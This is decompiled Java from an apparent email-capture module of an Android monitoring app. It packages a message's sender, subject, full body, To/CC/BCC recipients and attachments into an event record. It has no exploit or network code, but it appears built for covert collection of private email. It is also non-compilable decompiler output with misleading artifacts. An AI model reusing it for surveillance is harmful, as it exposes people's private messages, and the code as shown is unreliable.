package com.vvt.capture.email;

import com.vvt.capture.email.a.d;
import com.vvt.events.FxEmailEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxRecipientType;
import com.vvt.events.h;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
{
  public static FxEmailEvent a(c paramc, d paramd)
  {
    Object localObject1 = a(paramc);
    Object localObject2 = paramd.a((HashSet)localObject1);
    boolean bool = paramc.b();
    if (bool) {}
    FxEmailEvent localFxEmailEvent;
    for (localObject1 = FxEventDirection.IN;; localObject1 = FxEventDirection.OUT)
    {
      localFxEmailEvent = new com/vvt/events/FxEmailEvent;
      localFxEmailEvent.<init>();
      long l = paramc.a();
      localFxEmailEvent.setEventTime(l);
      localFxEmailEvent.setDirection((FxEventDirection)localObject1);
      Object localObject3 = paramc.c();
      localFxEmailEvent.setSenderEmail((String)localObject3);
      localObject3 = paramc.i();
      localFxEmailEvent.setEmailBody((String)localObject3);
      localObject3 = paramc.g();
      localFxEmailEvent.setSubject((String)localObject3);
      localObject3 = paramc.c();
      localObject3 = a((HashMap)localObject2, (String)localObject3);
      localFxEmailEvent.setSenderContactName((String)localObject3);
      localObject3 = FxEventDirection.OUT;
      if (localObject1 == localObject3)
      {
        localObject1 = paramc.d();
        localObject3 = FxRecipientType.TO;
        a((HashMap)localObject2, (String[])localObject1, (FxRecipientType)localObject3, localFxEmailEvent);
        localObject1 = paramc.e();
        localObject3 = FxRecipientType.CC;
        a((HashMap)localObject2, (String[])localObject1, (FxRecipientType)localObject3, localFxEmailEvent);
        localObject1 = paramc.f();
        localObject3 = FxRecipientType.BCC;
        a((HashMap)localObject2, (String[])localObject1, (FxRecipientType)localObject3, localFxEmailEvent);
      }
      localObject1 = paramc.h();
      localObject2 = ((List)localObject1).iterator();
      for (;;)
      {
        bool = ((Iterator)localObject2).hasNext();
        if (!bool) {
          break;
        }
        localObject1 = (a)((Iterator)localObject2).next();
        localObject3 = new com/vvt/events/a;
        ((com.vvt.events.a)localObject3).<init>();
        String str = ((a)localObject1).a();
        ((com.vvt.events.a)localObject3).a(str);
        localObject1 = ((a)localObject1).b();
        ((com.vvt.events.a)localObject3).b((String)localObject1);
        localFxEmailEvent.addAttachment((com.vvt.events.a)localObject3);
      }
    }
    return localFxEmailEvent;
  }
  
  private static String a(HashMap paramHashMap, String paramString)
  {
    String str1 = "";
    boolean bool = paramHashMap.containsKey(paramString);
    if (bool)
    {
      str1 = (String)paramHashMap.get(paramString);
      if (str1 != null)
      {
        String str2 = str1.trim();
        int i = str2.length();
        if (i != 0) {}
      }
      else
      {
        str1 = "";
      }
    }
    return str1;
  }
  
  private static HashSet a(c paramc)
  {
    int i = 0;
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    Object localObject1 = paramc.c();
    localHashSet.add(localObject1);
    String[] arrayOfString = paramc.d();
    int j = arrayOfString.length;
    int k = 0;
    localObject1 = null;
    String str;
    while (k < j)
    {
      str = arrayOfString[k];
      localHashSet.add(str);
      k += 1;
    }
    arrayOfString = paramc.e();
    j = arrayOfString.length;
    k = 0;
    localObject1 = null;
    while (k < j)
    {
      str = arrayOfString[k];
      localHashSet.add(str);
      k += 1;
    }
    localObject1 = paramc.f();
    int m = localObject1.length;
    while (i < m)
    {
      Object localObject2 = localObject1[i];
      localHashSet.add(localObject2);
      i += 1;
    }
    return localHashSet;
  }
  
  private static void a(HashMap paramHashMap, String[] paramArrayOfString, FxRecipientType paramFxRecipientType, FxEmailEvent paramFxEmailEvent)
  {
    int i = paramArrayOfString.length;
    int j = 0;
    while (j < i)
    {
      String str = paramArrayOfString[j];
      h localh = new com/vvt/events/h;
      localh.<init>();
      localh.a(str);
      str = a(paramHashMap, str);
      localh.b(str);
      localh.a(paramFxRecipientType);
      paramFxEmailEvent.addRecipient(localh);
      j += 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */